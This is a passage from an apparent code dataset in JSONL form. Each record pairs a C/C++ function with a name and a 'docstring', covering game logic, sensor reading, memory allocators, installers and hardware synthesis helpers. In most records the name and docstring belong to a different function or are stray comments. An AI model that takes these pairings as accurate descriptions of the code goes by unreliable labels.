(board_info.selected_engaged && \\n\\t\\t!board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_attacked)\\n\\t{\\n\\t\\trequest_sound_effect(board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].name, \\n\\t\\t\\t\"CREATURE\", \"ENGAGED\", false);\\n\\n\\t\\tset_highlight_board(board_info.selected_x, board_info.selected_y, 1.0, PIECE, \\n\\t\\t\\tfalse, false, true, false, true, \"\");\\n\\t}\\n\\telse\\n\\t{\\n\\t\\t\/\/ Not engaged, so no close combat possible..\\n\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_attacked = true;\\n\\n\\t\\t\/\/ But can our selected piece also shoot?\\n\\t\\tif (!board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_shot)\\n\\t\\t{\\n\\t\\t\\t\/\/ Yes, so highlight enemy pieces that can be shot..\\n\\t\\t\\ttotal = set_highlight_board(board_info.selected_x, board_info.selected_y, \\n\\t\\t\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].ranged_combat_range, PIECE, \\n\\t\\t\\t\\tfalse, false, true, true, true, \"\");\\n\\n\\t\\t\\t\/\/ Any targets?\\n\\t\\t\\tif (total == 0)\\n\\t\\t\\t{\\n\\t\\t\\t\\tclear_highlight_board();\\n\\t\\t\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_shot = true;\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\trequest_sound_effect(board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].name, \\n\\t\\t\\t\\t\\t\"CREATURE\", \"SHOOTING PHASE\", true);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\n\\tif (board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_attacked &&\\n\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_shot)\\n\\t{\\n\\t\\tunselect_piece();\\n\\t}\\n}'}","id":4618}
{"content":"{'function_name': 'get_vector_from_string', 'docstring': '\/\/ \u043f\u043e\u0438\u0441\u043a \u043e\u043a\u043e\u043d\u0447\u0430\u043d\u0438\u044f \u0441\u043b\u043e\u0432\u0430 \u043f\u043e \u043f\u0440\u043e\u0431\u0435\u043b\u0443', 'code': 'vector<string> get_formatted_vector(vector<string> &vec) {\\n    vector<string> Text(0); \/\/ \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c\u044b\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\\n    string Temp; \/\/ \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430 \u0434\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u043f\u043e\u0434\u0441\u0442\u0440\u043e\u043a\\n    string replace(\"Vau!!!\"); \/\/ \u0437\u0430\u043c\u0435\u043d\u044f\u0435\u043c\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430\\n    try {\\n        for (string &word : vec) {\\n            if (word.length() >= 10 && Temp.length() <= (40 - replace.length())) {\\n                Temp.append(replace);\\n                Temp.append(\" \");\\n            } else if (Temp.length() <= (40 - word.length())) {\\n                Temp.append(word);\\n                Temp.append(\" \");\\n            } else {\\n                Text.push_back(Temp);\\n                Temp = \"\";\\n            }\\n        }\\n        Text.push_back(Temp);\\n    }\\n    catch (length_error &e) {\\n        cout << \"length_error: \" << e.what() << \"\\\\n\";\\n    }\\n    catch (out_of_range &e) {\\n        cout << \"out_of_range: \" << e.what() << \"\\\\n\";\\n    }\\n    return Text;\\n}'}","id":4619}
{"content":"{'function_name': 'dis_frente', 'docstring': '\/\/Serial.println(distancia);', 'code': 'long dis_lado()\\n{\\n\\n  \/\/seta o pino 12 com um pulso baixo \"LOW\" ou desligado ou ainda 0\\n  digitalWrite(trigPin_lado, LOW);\\n  \/\/delay de 2 microssegundos\\n  delayMicroseconds(2);\\n  \/\/seta o pino 12 com pulso alto \"HIGH\" ou ligado ou ainda 1\\n  digitalWrite(trigPin_lado, HIGH);\\n  \/\/delay de 10 microssegundos\\n  delayMicroseconds(10);\\n  \/\/seta o pino 12 com um pulso baixo novamente\\n  digitalWrite(trigPin_lado, LOW);\\n  \/\/pulseInt l\u00ea o tempo entre a chamada e o pino entrar em high\\n  long duration = pulseIn(echoPin_lado, HIGH);\\n  \/\/Esse calculo \u00e9 baseado em s = v. t, lembrando quye o tempo vem dobrado\\n  \/\/porque \u00e9 o tempo de ida e volta do ultrassom\\n  long distancia = duration \/ 29 \/ 2;\\n  \/\/Serial.print(\"Distancia em CM: \");\\n  \/\/Serial.println(distancia);\\n  return distancia;\\n}'}","id":4621}
{"content":"{'function_name': '__slab_move_to_front', 'docstring': '\/\/ Empty list', 'code': 'inline void __slab_move_to_back(cache_t *cp, slab_t *slab)\\n{\\n    if (cp->slabs_back == slab)\\n    {\\n        return;\\n    }\\n\\n    __slab_remove(cp, slab);\\n\\n    \/\/ Never executed\\n    if (!cp->slabs)\\n    {\\n        slab->prev = slab;\\n        slab->next = slab;\\n        cp->slabs = slab;\\n    }\\n    \/\/ Append element to back\\n    else\\n    {\\n        slab->prev = cp->slabs;\\n        cp->slabs->next = slab;\\n        slab->next = cp->slabs_back;\\n        slab->next = cp->slabs_back;\\n        cp->slabs_back->prev = slab;\\n    }\\n\\n    cp->slabs_back = slab;\\n}'}","id":4625}
{"content":"{'function_name': 'GetConsoleData', 'docstring': '\/\/ \u30af\u30ea\u30c6\u30a3\u30ab\u30eb\u30bb\u30af\u30b7\u30e7\u30f3', 'code': 'DWORD GetConsoleData(DWORD pos, UPDATE_COMSOLE_DATA& data)\\n{\\n\\t\/\/ \u30af\u30ea\u30c6\u30a3\u30ab\u30eb\u30bb\u30af\u30b7\u30e7\u30f3\\n\\tCoCriticalSectionCtrl critical(GetConsoleCritical());\\n\\n\\tCoConsoleDataArray& console_data = GetConsoleData(critical);\\n\\tdata = console_data.ElementAt(pos);\\n\\n\\treturn 0;\\n}'}","id":4626}
{"content":"{'function_name': 'VIRTUALSubData', 'docstring': '\/* virtual field *\/', 'code': 'static short ExecuteSubData(char *name,short (*func)(...),char **tmp,PassableStruct *p,char *modulename)\\n{\\n\\tshort retval=FALSE;\\n\\n\/*lint -e746*\/\\n\\tif(func==ScrolledListSubData)\\n\\t{\\n\\t\\tretval=func(tmp,p->r);\\n\\t} else {\\n\\t\\tretval=func(tmp,p,modulename);\\n\\t}\\n\/*lint +e746*\/\\n\\tif(retval<1) \\n\\t{\\n\\t\\tif(retval==(-1))\\n\\t\\t{\\n\\t\\t\\tprterr(\"Error Fatal Error from [%s] encountered substitution aborted .....\",name);\\n\\t\\t}\\n\\t\\tif(diageval || diageval_field || diagapps)\\n\\t\\t{\\n\\t\\t\\tprterr(\"DIAG ExecuteSubData Returning [%.255s] (First 255 characters).\",*tmp);\\n\\t\\t}\\n\\t}\\n\\treturn(retval);\\n}'}","id":4629}
{"content":"{'function_name': 'MimeOleGenerateFileNameW', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleCreateSecurity(IMimeSecurity **ppSecurity)\\r\\n{\\r\\n    \/\/ check params\\r\\n    if (NULL == ppSecurity)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Create the object\\r\\n    *ppSecurity = (IMimeSecurity *) new CSMime;\\r\\n    if (NULL == *ppSecurity)\\r\\n        return TrapError(E_OUTOFMEMORY);\\r\\n\\r\\n    \/\/ Done\\r\\n    return S_OK;\\r\\n}'}","id":4638}
{"content":"{'function_name': 'UnpackBinaryResources', 'docstring': \"\/\/ So if we get 'resource not found' error just ignore it.\", 'code': 'bool RunSetup(bool have_upacked_setup, const wchar_t* base_path,\\n              const wchar_t* archive_name, int* exit_code) {\\n  \/\/ There could be three full paths in the command line for setup.exe (path\\n  \/\/ to exe itself, path to archive and path to log file), so we declare\\n  \/\/ total size as three + one additional to hold command line options.\\n  wchar_t cmd_line[MAX_PATH * 4];\\n\\n  \/\/ Get the path to setup.exe first.\\n  if (have_upacked_setup) {\\n    if (!SafeStrCopy(cmd_line, L\"\\\\\"\", _countof(cmd_line)) ||\\n        !::lstrcat(cmd_line, base_path) ||\\n        !::lstrcat(cmd_line, kSetupName) ||\\n        !::lstrcat(cmd_line, L\"\\\\\"\")) {\\n      return false;\\n    }\\n  } else {\\n    if (!GetSetupExePathFromRegistry(cmd_line, sizeof(cmd_line))) {\\n      return false;\\n    }\\n  }\\n\\n  \/\/ Append the command line param for chrome archive file\\n  if (!::lstrcat(cmd_line, L\" --install-archive=\\\\\"\") ||\\n      !::lstrcat(cmd_line, base_path) ||\\n      !::lstrcat(cmd_line, archive_name) ||\\n      !::lstrcat(cmd_line, L\"\\\\\"\")) {\\n    return false;\\n  }\\n\\n  \/\/ Get any command line option specified for mini_installer and pass them\\n  \/\/ on to setup.exe\\n  AppendCommandLineFlags(cmd_line, _countof(cmd_line) - lstrlen(cmd_line));\\n\\n  return (RunProcessAndWait(NULL, cmd_line, exit_code));\\n}'}","id":4648}
{"content":"{'function_name': 'DoAllPathsCommand', 'docstring': '\/\/ Is there a path from n1 to n2, or vice versa?', 'code': 'void DoPlotCommand(const Options& opts, const HloModule& module,\\n                   const std::vector<std::string>& tokens) {\\n  std::string node_name = tokens[0];\\n\\n  \/\/ Find the node with the given name.\\n  const HloInstruction* instr = FindInstruction(module, node_name);\\n  const HloComputation* comp = FindComputation(module, node_name);\\n  if (!instr && !comp) {\\n    std::cerr << \"Couldn\\'t find HloInstruction or HloComputation named \"\\n              << node_name << \".\" << std::endl;\\n    return;\\n  }\\n\\n  uint64_t graph_width = kDefaultWidth;\\n  absl::flat_hash_set<const HloInstruction*> boundary;\\n  if (tokens.size() >= 2) {\\n    if (comp) {\\n      std::cerr << \"Can only use graph-size parameter with instructions, but \"\\n                << node_name << \" is a computation.\" << std::endl;\\n      return;\\n    }\\n\\n    int bound_index = 1;\\n    \/\/ Get the <width> if present.\\n    if (absl::SimpleAtoi(tokens[bound_index], &graph_width)) {\\n      bound_index++;\\n    } else {\\n      \/\/ <width> not found, need to reset graph_width.\\n      graph_width = kDefaultWidth;\\n    }\\n    \/\/ Get the \\'\/\\'.\\n    if (bound_index < tokens.size()) {\\n      \/\/ This token must be a \\'\/\\'.\\n      if (tokens[bound_index] != \"\/\") {\\n        std::cerr << \"Expect a \/, but get a \\'\" << tokens[bound_index] << \"\\'.\"\\n                  << std::endl;\\n        return;\\n      }\\n      bound_index++;\\n    }\\n    \/\/ Get the boundary nodes.\\n    while (bound_index < tokens.size()) {\\n      std::string bnode_name = tokens[bound_index];\\n      const HloInstruction* binstr = FindInstruction(module, bnode_name);\\n      if (!binstr) {\\n        std::cerr << \"Couldn\\'t find HloInstruction named \" << bnode_name << \".\"\\n                  << std::endl;\\n        return;\\n      }\\n      boundary.insert(binstr);\\n      bound_index++;\\n    }\\n  }\\n\\n  \/\/ Generate the graph and print the resulting string, which should be a\\n  \/\/ graphviz url.\\n  if (comp) {\\n    RenderAndDisplayGraph(opts, [&](RenderedGraphFormat format) {\\n      return RenderGraph(*comp, \/*label=*\/\"\",\\n                         comp->parent()->config().debug_options(), format,\\n                         hlo_render_options);\\n    });\\n  } else {\\n    RenderAndDisplayGraph(opts, [&](RenderedGraphFormat format) {\\n      return RenderNeighborhoodAround(*instr, graph_width, format,\\n                                      hlo_render_options,\\n                                      \/*boundary=*\/boundary);\\n    });\\n  }\\n}'}","id":4661}
{"content":"{'function_name': 'ShowGroupCB', 'docstring': '\/\/ hide help button', 'code': \"void TestSmtpCB(Fl_Input *o, void *u)\\n{\\n  char *ptr1, *ptr2;\\n  StripWhiteSpace(o);\\n  if(failed_continue == 1) \/\/ the user is responsible to get it right so do not test\\n    return;\\n  unsigned long lookup_result;\\n  \/\/ test to see if there is enough to stand a chance to test ok\\n  int tmp;\\n  ptr1 = (char *)strrchr(o->value(), '.');\\n  if(ptr1 == NULL)\\n    return;\\n  tmp = strlen(ptr1);\\n  if(tmp < 3) \/\/ to short\\n    return;\\n  if(tmp > 5) \/\/ to long\\n    return;\\n  tmp = 0;\\n  while(codes[tmp] != NULL)\\n  {\\n    char str[128];\\n    strcpy(str, o->value());\\n    ptr1 = (char *)strrchr(str, '.');\\n    strlwr(str);\\n    if(strstr(str, codes[tmp]) == ptr1)\\n      goto MATCH;\\nNEXT_ITERATION:\\n    tmp++;\\n  }\\n  smtp_test = 0;\\n  happy->hide();\\n  sad->show();\\n  return;\\nMATCH:\\n  lookup_result = LookupAddress(o->value());\\n  if(lookup_result != INADDR_NONE)\\n  {\\n    smtp_test = 1;\\n    if(smtp_test == 1)\\n    {\\n      sad->hide();\\n      happy->show();\\n    }\\n  }\\n  else\\n  {\\n    smtp_test = 0;\\n    happy->hide();\\n    sad->show();\\n  }\\n  NetworkError();\\n  SmtpValid();\\n}\"}","id":4671}
{"content":"{'function_name': 'denoiseb_rd35_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd36_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd36 read pattern: { denoiseb_update_0[d0, d1] -> raw[1 + 2d0, -1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2896 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_2896();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4672}
{"content":"{'function_name': 'ErrDBUpgradeForLocalisation', 'docstring': \"\/\/  Update the MSysLocales table with the new info for indices' locales\", 'code': 'LOCAL ERR ErrDBReadDBTrailer(\\n    const INST * const pinst,\\n    IFileSystemAPI * const pfsapi,\\n    const WCHAR * const wszFileName,\\n    __out_bcount( cbTrailer ) BYTE * const pbTrailer,\\n    const INT cbTrailer )\\n\/\/  ================================================================\\n\/\/\\n\/\/ Reads the last page of the database into the buffer pointed to by pbTrailer\\n\/\/\\n\/\/-\\n{\\n    Assert( pfsapi );\\n    Assert( wszFileName );\\n    Assert( pbTrailer );\\n    Assert( g_cbPage == cbTrailer );\\n    \\n    ERR         err     = JET_errSuccess;\\n    IFileAPI *  pfapi   = NULL;\\n    QWORD       cbSize  = 0;\\n    TraceContextScope tcScope( iorpHeader );\\n    tcScope->SetDwEngineObjid( objidSystemRoot );\\n\\n    if( cbTrailer < g_cbPage )\\n    {\\n        Error( ErrERRCheck( JET_errBufferTooSmall ) );\\n    }\\n    \\n    Call( pfsapi->ErrFileOpen(\\n            wszFileName,\\n            (   IFileAPI::fmfReadOnly |\\n                ( BoolParam( JET_paramEnableFileCache ) ? IFileAPI::fmfCached : IFileAPI::fmfNone ) ),\\n            &pfapi ) );\\n\\n    Call( pfapi->ErrSize( &cbSize, IFileAPI::filesizeLogical ) );\\n\\n    \/\/ there should be at least one page past the database header for us to read\\n    if( cbSize < QWORD ( cpgDBReserved + 1 )  * g_cbPage )\\n    {\\n        OSUHAEmitFailureTag( pinst, HaDbFailureTagCorruption, L\"d2482af5-0d49-4abb-ab54-13846e8c5034\" );\\n        Error( ErrERRCheck( JET_errDatabaseCorrupted ) );\\n    }\\n\\n    Call( pfapi->ErrIORead( *tcScope, cbSize - QWORD( cbTrailer ), cbTrailer, pbTrailer, qosIONormal ) );\\n    CallS( err );\\n\\nHandleError:\\n\\n    delete pfapi;\\n    return err;\\n}'}","id":4678}
{"content":"{'function_name': 'enqueue', 'docstring': '\/\/ The future contained by the packaged task will contain the result of the task.', 'code': 'void worker_thread(size_t i,\\n        std::vector<std::mutex*>* m,\\n        std::vector<std::condition_variable*>* cv,\\n        std::vector<bool>* ready_to_go,\\n        std::vector<bool>* processed,\\n        Matrix* final_result,\\n        Matrix* partial_result,\\n        Matrix* Q) {\\n    \/\/ Wait until main() sends data\\n    std::unique_lock<std::mutex> lk(*((*m)[i]));\\n    (*cv)[i]->wait(lk, [i, ready_to_go] { return (*ready_to_go)[i]; });\\n\\n    \/\/ Line i from the partial result is ready.\\n    int sum;\\n    for (size_t k = 0; k < Q->get_cols(); k++) {\\n        sum = 0;\\n        for (size_t j = 0; j < partial_result->get_grid().size(); j++) {\\n            sum += partial_result->get_grid()[i][j] * Q->get_grid()[j][k];\\n        }\\n        final_result->push_grid(i, k, sum);\\n    }\\n\\n    \/\/ Send data back to product()\\n    (*processed)[i] = true;\\n\\n    \/\/ Manual unlocking is done before notifying, to avoid waking up\\n    \/\/ the waiting thread only to block again\\n    lk.unlock();\\n    (*cv)[i]->notify_one();\\n}'}","id":4681}
{"content":"{'function_name': 'parseLine', 'docstring': '\/\/ This assumes that a digit will be found and the line ends in \" Kb\".', 'code': 'int getValue_virtual_memory()\\n{   \\n    \/\/ Note: this value is in KB\\n    FILE* file = fopen(\"\/proc\/self\/status\", \"r\");\\n    int result = -1;\\n    char line[128];\\n    while(fgets(line, 128, file) != NULL){\\n        if(strncmp(line, \"VmSize:\", 7) == 0){\\n            result = parseLine(line);\\n            break;\\n        }\\n    }\\n    fclose(file);\\n    return result;\\n}'}","id":4682}
{"content":"{'function_name': 'main', 'docstring': '\/\/\uba87 \ubc88\uc9f8 \uc218\ub97c \uad6c\ud560\uc9c0 \uc785\ub825 \ubc1b\uc2b5\ub2c8\ub2e4', 'code': 'long long Fibo(int n) {\\n\\tlong long n1 = 1, n2 = 1;\\n\\tlong long n3 = 0;\/\/n3\uac00 \uacb0\uacfc\uac12\uc774\uace0 n1\uacfc n2\ub77c\ub294 \uc804\uc804\ud56d\uacfc \uc804\ud56d\uc744 \ub461\ub2c8\ub2e4\\n\\tif (n == 1) {\\n\\t\\treturn 1;\\n\\t}\\n\\telse if (n == 2) {\\n\\t\\treturn 1;\\n\\t}\\n\\telse {\\n\\t\\tfor (int i = 0; i < n - 2; i++) {\\n\\t\\t\\tn3 = n1 + n2;\/\/\uacb0\uacfc\uac12 \ub3c4\ucd9c\\n\\t\\t\\tn1 = n2;\\n\\t\\t\\tn2 = n3;\/\/ n1,n2 \uac31\uc2e0\\n\\t\\t}\\n\\t}\\n\\n\\treturn n3;\\n}'}","id":4683}
{"content":"{'function_name': 'stringToFloat', 'docstring': '\/\/converts string to float data type', 'code': \"bool isOperator(char a){ \/\/check if the given character is an operator or not;\\n\\tbool flag = false;\\n\\tif(a=='+'||a=='-'||a=='*'||a=='\/'){\\n\\t\\tflag = true;\\n\\t}\\n\\treturn flag;\\n}\"}","id":4687}
{"content":"{'function_name': 'maxFruit', 'docstring': '\/\/ which nodes contain Fruits ', 'code': 'int main() \\n{ \\n\\tint n = 12; \/\/ Number of nodes \\n\\tint k = 2; \/\/ Number of allowed jumps \\n\\t\\n\\tvector<int> tree[N]; \\n\\t\\n\\t\/\/ Edges \\n\\taddEdge(tree, 1, 2); \\n\\taddEdge(tree, 1, 3); \\n\\taddEdge(tree, 2, 4); \\n\\taddEdge(tree, 2, 5); \\n\\taddEdge(tree, 5, 9); \\n\\taddEdge(tree, 9, 10); \\n\\taddEdge(tree, 9, 11); \\n\\taddEdge(tree, 11, 12); \\n\\taddEdge(tree, 3, 7); \\n\\taddEdge(tree, 7, 6); \\n\\taddEdge(tree, 7, 8); \\n\\t\\n\\tint NodesWithFruits[] = { 2, 4, 5, 7, 8, 9, 11, 12 }; \\n\\t\\n\\t\/\/ Number of nodes with fruits \\n\\tint m = sizeof(NodesWithFruits) \/ sizeof(NodesWithFruits[0]); \\n\\t\\n\\tint ans = maxFruit(tree, NodesWithFruits, n, m, k); \\n\\t\\n\\tcout << ans << endl; \\n\\t\\n\\treturn 0; \\n}'}","id":4700}
{"content":"{'function_name': 'SetUI', 'docstring': '\/\/health', 'code': 'HRESULT InitUI(void)\\n{\\n\\tLPDIRECT3DDEVICE9 pDevice = GetDevice();\\n\\tVERTEX_2D *pVtx;\\n\\tpUI = (UI *)malloc(UI_COMPONENT * sizeof(UI));\\n\\n\\tif (FAILED(D3DXCreateTextureFromFile(pDevice, \"data\/TEXTURE\/HP.png\", &g_pTextureUI[0])))return E_FAIL;\\n\\tif (FAILED(D3DXCreateTextureFromFile(pDevice, \"data\/TEXTURE\/Number.png\", &g_pTextureUI[1])))return E_FAIL;\\n\\n\\tSetUI();\\n\\n\\t\/\/create vertex buffer\\n\\tif (FAILED(pDevice->CreateVertexBuffer(sizeof(VERTEX_2D) * 4 * UI_COMPONENT, D3DUSAGE_WRITEONLY, FVF_VERTEX_2D, D3DPOOL_MANAGED, &g_pVtxBuffUI, NULL))) return E_FAIL;\\n\\n\\tg_pVtxBuffUI->Lock(0, 0, (void**)&pVtx, 0);\\n\\tfor (int nCntUI = 0; nCntUI < UI_COMPONENT; nCntUI++, pVtx += 4)\\n\\t{\\n\\t\\tpVtx[0].pos = D3DXVECTOR3(pUI[nCntUI].pos.x - pUI[nCntUI].size.x, pUI[nCntUI].pos.y - pUI[nCntUI].size.y, 0.0f);\\n\\t\\tpVtx[1].pos = D3DXVECTOR3(pUI[nCntUI].pos.x + pUI[nCntUI].size.x, pUI[nCntUI].pos.y - pUI[nCntUI].size.y, 0.0f);\\n\\t\\tpVtx[2].pos = D3DXVECTOR3(pUI[nCntUI].pos.x - pUI[nCntUI].size.x, pUI[nCntUI].pos.y + pUI[nCntUI].size.y, 0.0f);\\n\\t\\tpVtx[3].pos = D3DXVECTOR3(pUI[nCntUI].pos.x + pUI[nCntUI].size.x, pUI[nCntUI].pos.y + pUI[nCntUI].size.y, 0.0f);\\n\\t\\tpVtx[0].col = D3DCOLOR_RGBA(255, 255, 255, 255);\\n\\t\\tpVtx[1].col = D3DCOLOR_RGBA(255, 255, 255, 255);\\n\\t\\tpVtx[2].col = D3DCOLOR_RGBA(255, 255, 255, 255);\\n\\t\\tpVtx[3].col = D3DCOLOR_RGBA(255, 255, 255, 255);\\n\\t\\tpVtx[0].rhw = 1.0f;\\n\\t\\tpVtx[1].rhw = 1.0f;\\n\\t\\tpVtx[2].rhw = 1.0f;\\n\\t\\tpVtx[3].rhw = 1.0f;\\n\\t\\tif (nCntUI < 3)\\n\\t\\t{\\n\\t\\t\\tpVtx[0].tex = D3DXVECTOR2(0.0, 0.0);\\n\\t\\t\\tpVtx[1].tex = D3DXVECTOR2(1.0, 0.0);\\n\\t\\t\\tpVtx[2].tex = D3DXVECTOR2(0.0, 1.0);\\n\\t\\t\\tpVtx[3].tex = D3DXVECTOR2(1.0, 1.0);\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tpVtx[0].tex = D3DXVECTOR2((pUI[nCntUI].nDisplayNumber * 0.1f), 0.0);\\n\\t\\t\\tpVtx[1].tex = D3DXVECTOR2((pUI[nCntUI].nDisplayNumber * 0.1f + 0.1f), 0.0);\\n\\t\\t\\tpVtx[2].tex = D3DXVECTOR2((pUI[nCntUI].nDisplayNumber * 0.1f), 1.0);\\n\\t\\t\\tpVtx[3].tex = D3DXVECTOR2((pUI[nCntUI].nDisplayNumber * 0.1f + 0.1f), 1.0);\\n\\t\\t}\\n\\t}\\n\\tg_pVtxBuffUI->Unlock();\\n\\treturn S_OK;\\n}'}","id":4704}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ loaded), and ensure that no session id is presented to the peer.', 'code': 'TEST_F(HTTPSOCSPTest, Invalid) {\\n  if (!SystemSupportsOCSP()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support OCSP\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      EmbeddedTestServer::OCSPConfig::ResponseType::kInvalidResponse);\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  \/\/ Without a positive OCSP response, we shouldn\\'t show the EV status, but also\\n  \/\/ should not show any revocation checking errors.\\n  EXPECT_FALSE(cert_status & CERT_STATUS_IS_EV);\\n  EXPECT_EQ(0u, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":4711}
{"content":"{'function_name': 'GetMonsterList', 'docstring': '\/*m_List_Monster.DeleteAllItems();*\/', 'code': 'DWORD WINAPI ThreadProc(LPVOID lpParameter)\\r\\n{\\r\\n\\tSKILL temp;\\r\\n\\ttemp = skillList[0];\\r\\n\\tint i = 0;\\r\\n\\tskillList[0] = \/*skillList[m_List_Skill.GetCurSel()]*\/skillList[1];\\r\\n\\t\/*skillList[m_List_Skill.GetCurSel()]*\/skillList[1] = temp;\\r\\n\\t\/\/sscanf(id,\"%x\",&skill_ID);\\r\\n\\t\/*if (!flag)\\r\\n\\t{*\/\\r\\n\\t\\tflag = TRUE;\\r\\n\\t\\twhile(flag)\\r\\n\\t\\t{\\r\\n\\t\\t\\tif (monsterList[i].dx<=17\/*skillList[0].dx*\/)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tSelectMonster(monsterList[i].id);\\r\\n\\t\\t\\t\\tSleep(skillList[0].coolingTime);\\r\\n\\t\\t\\t\\tUseSkill(skillList[0].id,pplayerInfo->selectedMonsterID);\\r\\n\\t\\t\\t\\tSleep(skillList[0].coolingTime);\\r\\n\\t\\t\\t\\twhile (pplayerInfo->selectedMonsterID!= 0)\/\/\u602a\u6ca1\u6b7b\u7ee7\u7eed\u7528\u6280\u80fd\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tUseSkill(skillList[0].id,pplayerInfo->selectedMonsterID);\\r\\n\\t\\t\\t\\t\\tSleep(skillList[0].coolingTime);\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t\\ti = i % 2;\\r\\n\\t\\t\\t}\\r\\n\\t\\t\\tGetMonsterList();\\r\\n\\t\\t}\\r\\n\\t\/\/}\\r\\n\\t\/\/else\\r\\n\\t\/\/{\\r\\n\\t\/\/\\tflag = FALSE;\\r\\n\\t\/\/}\\r\\n\\treturn 0;\\r\\n}'}","id":4716}
{"content":"{'function_name': 'init_function', 'docstring': '\/\/LOGI(hello);', 'code': 'JNIEXPORT jboolean JNICALL\\nJava_com_example_myapplication_MainActivity_check(\\n        JNIEnv* env,\\n        jobject \/* this *\/,\\n        jstring enc) {\\n\/\/    std::string so( std::begin(encrypt_message), std::end(encrypt_message) );\/\/int\u6570\u7ec4\u8f6c\u5b57\u7b26\u4e32\\n    std::string tmp = jstring2str(env,enc);\\n    jboolean result=0;\\n    if(tmp.length()!=8){\\n        return result;\\n    }\\n    for(int i=0;i<8;i++){\\n        v[i]=(uint8_t)(tmp[i]);\\n    }\\n\\n    result=encrypt((uint32_t*)v);\\n\/\/    if(!tmp.compare(\"GKcTFg0!\\\\x00\")){\\n\/\/        result = 1;\\n\/\/    }\\n    return result;\\n}'}","id":4720}
{"content":"{'function_name': 'demosaicb_rd13_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd14_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd14 read pattern: { demosaicb_update_0[d0, d1] -> denoise[1 + 2d0, 1 + d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 1 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write1 = denoise.denoise_denoise_update_0_write1_merged_banks_9.peek_1();\\n  return value_denoise_denoise_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4721}
{"content":"{'function_name': 'AMREX_FORCE_INLINE', 'docstring': '\/\/ are cell-centered, or 2 points with weights depending on the distance, if both grids are nodal', 'code': 'AMREX_GPU_DEVICE AMREX_FORCE_INLINE\\nvoid warpx_interp (const int j,\\n                   const int k,\\n                   const int l,\\n                   amrex::Array4<amrex::Real      > const& dst_arr,\\n                   amrex::Array4<amrex::Real const> const& src_arr,\\n                   const amrex::IntVect& src_stag,\\n                   const int nox = 2,\\n                   const int noy = 2,\\n                   const int noz = 2,\\n                   amrex::Real const* stencil_coeffs_x = nullptr,\\n                   amrex::Real const* stencil_coeffs_y = nullptr,\\n                   amrex::Real const* stencil_coeffs_z = nullptr)\\n{\\n    using namespace amrex;\\n\\n    \/\/ Pad input array with zeros beyond ghost cells\\n    \/\/ for out-of-bound accesses due to large-stencil operations\\n    const auto src_arr_zeropad = [src_arr] 